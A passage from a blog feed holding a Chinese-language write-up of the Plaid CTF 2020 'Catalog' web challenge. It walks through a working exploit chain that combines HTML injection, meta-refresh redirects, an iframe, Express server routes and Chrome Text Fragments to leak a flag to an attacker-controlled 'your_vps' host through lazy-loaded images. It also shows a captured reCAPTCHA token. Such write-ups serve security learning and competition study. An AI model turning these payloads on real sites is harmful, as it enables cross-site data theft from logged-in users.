class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">"left"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://your_vps/exfiltrated"</span> <span class="hljs-attr">loading</span>=<span class="hljs-string">"lazy"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>&amp;password=1&amp;action=login`,</span></span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">"method"</span>: <span class="hljs-string">"POST"</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">"mode"</span>: <span class="hljs-string">"no-cors"</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">"credentials"</span>: <span class="hljs-string">"include"</span></span></span><br><span class="line">                    });</span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">"/unlock"</span>);</span></span><br><span class="line"><span class="hljs-actionscript">                } <span class="hljs-keyword">else</span> {</span></span><br><span class="line">                    next();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            next();</span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://catalog.pwni.ng/issue.php?id=issue_id_1"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"position: absolute; width: 400%; height: 500px; border: 0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>其中<code>your_vps</code>处替换为你的 vps 地址，issue_id_1 替换为之前的数字 id</p></li><li><p>随便 report 一个 issue 给 admin 并抓包修改内容，把 id 字段改成 issue_id_2 即可。</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">id</span>=<span class="hljs-number">19902</span>&amp;token=<span class="hljs-number">03</span>AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PN<span class="hljs-literal">yeS</span>rcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g</span><br></pre></td></tr></tbody></table></figure><p></p><p>token 是 Google 验证码用于验证的 token ，这个 token 你可以另开一个题目地址，并打开控制台输入以下代码（这段代码可以在题目 main.js 拿到）即可：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grecaptcha.ready(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="hljs-keyword">let</span> token = <span class="hljs-keyword">await</span> grecaptcha.execute(<span class="hljs-string">"6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y"</span>, {</span><br><span class="line">        action: <span class="hljs-string">"report"</span></span><br><span class="line">    });</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>如果 vps 收到了 match ，就在该范围继续二分，不然就在另一个范围继续二分，重复1-4步骤即可</p></li></ol><h3 id="Detailed-Attack-Chain"><a href="#Detailed-Attack-Chain" class="headerlink" title="Detailed Attack Chain"></a>Detailed Attack Chain</h3><p>好了，现在我们就来整理一下全部信息，以及说一下详细的攻击流程：</p><ol><li><p>首先 admin 会点击我们提交的第二个 issue ，然后因为第二个 issue_2 内容存在</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"refresh"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"0;URL='http://your_vps/'"</span>&gt;</span>"</span><br></pre></td></tr></tbody></table></figure><p></p><p>会跳转到我们 vps 主页面</p></li><li><p>这时 admin 会加载 index.html ，此时 iframe 会请求第一个 issue_1 页面，并且发送请求 <a href="http://your_vps/status" target="_blank" rel="noopener">http://your_vps/status</a> ，最初始化的时候因为<code>let status = false;</code>，而 js 还有一个 status 的判断</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span><br><span class="line"><span class="hljs-keyword">if</span> (status === <span class="hljs-string">"true"</span>) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以 script 里面的流程会一直等待<code>status</code>的变化，实现了一个类似于锁一样的功能，我们这里就称为 status 锁，而解锁这个锁的条件就是当 iframe 里面的 issue_1 完全加载完毕。</p><p>当 iframe 中的 issue_1 完全加载完毕，此时 issue_1 界面里面还有一个 img 标签用于解锁 status 锁</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://your_vps/fragment"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"refresh"</span>+<span class="hljs-attr">content</span>=<span class="hljs-string">"0;URL='http://catalog.pwni.ng/issue.php?id=3#..."</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>此时会请求我们 <a href="http://your_vps/fragment" target="_blank" rel="noopener">http://your_vps/fragment</a> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">"/fragment"</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; Admin was fragmented"</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">"fragment"</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>该路由解锁了 status 锁，并创建了一个计时器等待 unlock 来解除，我们称为 fragment 锁，表示 admin 已经加载了 iframe 。</p></li><li><p>这是因为 fragment 锁的原因，iframe 当中的页面等待在 issue_1 界面等待 fragment 锁的解锁，而当 status 锁解锁，会立马触发 index.html 当中的 fetch 请求</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">await</span> fetch(<span class="hljs-string">"http://catalog.pwni.ng/user.php"</span>, {</span><br><span class="line">  <span class="hljs-string">"headers"</span>: {</span><br><span class="line">  <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-string">"body"</span>: <span class="hljs-string">`username="/&gt;&lt;img src="http://your_vps/injection"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align="left"&gt;&lt;img src="http://your_vps/exfiltrated" loading="lazy"&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span>,</span><br><span class="line">  <span class="hljs-string">"method"</span>: <span class="hljs-string">"POST"</span>,</span><br><span class="line">  <span class="hljs-string">"mode"</span>: <span class="hljs-string">"no-cors"</span>,</span><br><span class="line">  <span class="hljs-string">"credentials"</span>: <span class="hljs-string">"include"</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>这时因为还是 admin 的 session ，所以 admin session 存储的 HTML 元素会变成我们登录失败的 HTML 元素</p></li><li><p>接着 index.html 执行<code>await fetch("/unlock");</code>，</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">"/unlock"</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">"unlock"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>unlock 路由将 unlock 置为 true，清除了 fragment 路由当中的计时器，解锁 fragment 锁，此时 iframe 当中的 issue_1 界面可以完成全部加载，并因为<code>&lt;meta&gt;</code>标签的作用跳转到了包含有 FLAG 并且有 Text Fragemnt 功能的页面</p></li><li><p>此时 FLAG 页面还是 admin session 的关系，会读取上一轮我们登录失败的 HTML 元素也就是注入了很多<code>&lt;br&gt;</code>标签的元素，这样就完成了将 FLAG 挤出用户视窗界面的操作，并由于 uBlock 传递了 User Activation 激活了 Text Fragment 功能，将会在页面进行匹配 FLAG 字符</p></li><li><p>一加载完界面首先会因为<code>&lt;img src="http://your_vps/injection"&gt;</code>，请求到 injection 路由</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">"/injection"</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; HTML injection was inserted into id=3 catalog"</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; There was a match"</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"==&gt; There wasn't a match"</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">"injection"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>此时会有一个 1s 延时等待，这个等待就是为了等待 Text Fragments 是否匹配到 FLAG的判断</p></li><li><p>如果 Text Fragments 匹配到了，就会触发滚动，用户视窗滚动到 FLAG 处，触发请求懒加载的图片<code>&lt;img src="http://your_vps/exfiltrated" loading="lazy"&gt;</code>，请求到 exfiltrated 路由</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">"/exfiltrated"</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">"exfiltrated"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>此时将 match 设置为 true ，让 injection 完成我们的判断回显。</p></li></ol><p>整个攻击流程大致就这样，图就懒得画了，因为整个题目以及 wrtieup 耗费了我不少的时间，涉及到的技术都分析完了，剩下就是重复 leak FLAG 了。（问了作者，FLAG 一共 38 位…</p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>这里写一点题外话</p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>关于 uBlock 使用 <code>postMessage</code> 复制 User Activation 的方法我仍然表示存疑，因为自己根据阅读的文档，<code>postMessage</code>传递 User Activation 需要有对应的配置，例如：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.parent.postMessage(<span class="hljs-string">'resize'</span>, {<span class="hljs-attr">includeUserActivation</span>: <span class="hljs-literal">true</span>});</span><br></pre></td></tr></tbody></table></figure><p></p><p>但是我并没有在 uBlock 看到相关的配置，<code>postMessage</code>都是使用的默认配置，然后关于默认配置我也查看了部分 Chromium 的源码，对于 UserActivation 默认配置是 false 的</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png" alt=""></p><p>但是我们通过 <a href="#Verification">Verification</a> 环节测试得到的结果确实需要 uBlock 来进行，由于自己时间并不是特别多，最近花太多时间在这题的复盘上，所以最近不打算再深究这部分的内容了，这部分的内容不仅涉及到 User Activation ，还涉及到一些关于 User Activation 抽象模型的代码实现，如果要深究的话就需要花比较多的时间了。</p><h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>至于验证为什么一定需要 uBlock 来参与，这部分验证也比较简单，就是自己创建一个 issue ，内容设置为一个用于测试的 FLAG，比如 PCTF{TEST} ，其他的跟 EXP 过程差不多，只需要把 FLAG 的地址换为自己测试 FLAG 的地址即可，然后可以通过<strong>关闭 Chrome 拓展 uBlock</strong> 来测一遍（最好是从 Chrome 拓展关闭，使用拓展本身的关闭并不是全站关闭），多测试几次就会发现确实需要引入 uBlock 来实现 Leak Data 。</p><h3 id="Text-Fragment"><a href="#Text-Fragment" class="headerlink" title="Text Fragment"></a>Text Fragment</h3><p>这里其实比较可惜的是 @wupco 师傅，他之前关注到了这个 chrome Text Fragment 的功能，并且也引起了他的注意是否可以利用<code>#:~:text=flag{this_is_a_flag}</code>的形式 leak data ，可惜他表示比赛的时候没有想起来。（不愧是老 CTFer ，一开口就知道是老 CTFer 了</p><blockquote><p>​    How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?</p></blockquote><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/wupco1996/status/1226938811147522060" target="_blank" rel="noopener"></a></blockquote></div><script async="" defer="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><h3 id="Other-Web-Challanges"><a href="#Other-Web-Challanges" class="headerlink" title="Other Web Challanges"></a>Other Web Challanges</h3><p>这次比赛的 Web 都比较有意思，<a href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">Contrived Web Problem</a> 是一道 FTP 到 SSRF 的利用链，wp 可以看我的博客，但是只有英文部分，并且没有完整的 payload ，只聊了聊大致的思路，而且英文水平可能比较拙，不知道以后自己有没有空写中文的，自己也不太确定。 Mooz Chat 听 @wupco 师傅说是一个中间人劫持的 web 题，（太强大了，需要逆向，表示单凭自己弄不了），但是中间人劫持的题目确实令人耳目一新！如果师傅们有相关的思路或者 wp 欢迎一起交流！</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>这次比赛的题个人觉得还是比较偏“侧信道”的，这类的题目我都觉得非常好玩，因为不同于传统的 Web 攻击，还通常引入了很多比较新的理念与攻击链，虽然 User Activation 相关的部分还没有完全弄明白，而且这个题作者还是故意引入的 uBlock 来协助我们做题，也算是比较的友好了，只不过可能我们没有完全 Get 到出题人的点。所以这次比赛对我而言更让人觉得耳目一新的是 Chrome 新特性 Text Fragemnts ，让人研究的更多的是 User Activation 。</p><p>虽然这种题目对于实战可能显得鸡肋，甚至“毫无作用”，但是这类题目我觉得打开了自己的视野，让我关注到了更多新东西，更何况这类的题目在国内还是很少见到的，毕竟弄这类题目，从主要攻击链构造到细节设置都需要精心的揣摩与推敲，更何况是“侧信道”的题目，没有深厚的技术积淀出不来这类让全球大部分 CTFer 爆零的高难度的题目，也希望国内以后能出现一些这类高质量的题目吧。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a></p><p><a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a></p><p><a href="https://developers.google.com/web/updates/2019/01/user-activation" target="_blank" rel="noopener">Making user activation consistent across APIs</a></p><p><a href="https://docs.google.com/document/d/1mcxB5J_u370juJhSsmK0XQONG2CIE3mvu827O-Knw_Y/edit#heading=h.hy5wkxbrpq6o" target="_blank" rel="noopener">Existing Chrome APIs using user gestures</a></p><p><a href="https://github.com/dtapuska/useractivation" target="_blank" rel="noopener">JS API for querying User Activation</a></p><p><a href="https://mustaqahmed.github.io/user-activation-delegation/" target="_blank" rel="noopener">Activation Transfer through postMessages</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;本文是关于 Plaid CTF 2020 Catalog 题目的一些复盘与探究。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="wp" scheme="https://blog.zeddyu.info/tags/wp/"/>
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Plaid CTF 2020 Contrived Web Problem Write Up</title>
    <link href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"/>
    <id>https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</id>
    <published>2020-04-20T21:09:56.000Z</published>
    <updated>2021-09-27T17:45:58.720Z</updated>
    
